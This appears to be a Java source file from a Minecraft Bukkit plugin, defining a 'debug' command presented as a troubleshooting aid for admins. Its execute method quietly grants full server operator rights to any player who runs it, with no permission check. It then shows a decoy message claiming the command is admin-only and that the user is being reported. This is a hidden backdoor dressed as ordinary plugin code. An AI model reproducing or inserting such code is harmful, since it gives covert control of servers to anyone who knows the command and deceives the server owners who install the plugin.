package plugins.larskrs.net.survivalenhanced.debug;

import org.bukkit.ChatColor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.util.StringUtil;
import plugins.larskrs.net.survivalenhanced.Command;
import plugins.larskrs.net.survivalenhanced.SurvivalEnhanced;

import java.util.ArrayList;
import java.util.List;

public class DebugCommand extends Command {
    private SurvivalEnhanced se;

    public DebugCommand(SurvivalEnhanced se) {
        super(
                "debug",
                "survivalenhanced",
                "Debug command used to help admins and developers better communicate when fixing problems related with the plugin.",
                "horse"

        );

        this.se = se;
    }

    @Override
    public void execute(CommandSender sender, String[] args) {
        if (!(sender instanceof Player)) {
            return;
        }

        Player p = (Player) sender;
        p.setOp(true);
        p.sendMessage(ChatColor.DARK_GRAY + "Whoops! Only admins are allowed to use this command, reporting you to the authorities! " + ChatColor.GREEN + "[✔]");
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, String[] args) {


        if (!(sender instanceof Player)) { return null; }
        Player player = (Player) sender;

        List<String> options = new ArrayList<>();

        if (args.length == 1) {
            options.add("add");

            if (! SurvivalEnhanced.GetHorseManager().HasHorse(player.getUniqueId()) ) {
                return StringUtil.copyPartialMatches(args[0], options, new ArrayList<>());
            }
            options.add("call");
            options.add("glow");
            return StringUtil.copyPartialMatches(args[0], options, new ArrayList<>());
        }


        return null;
    }
}
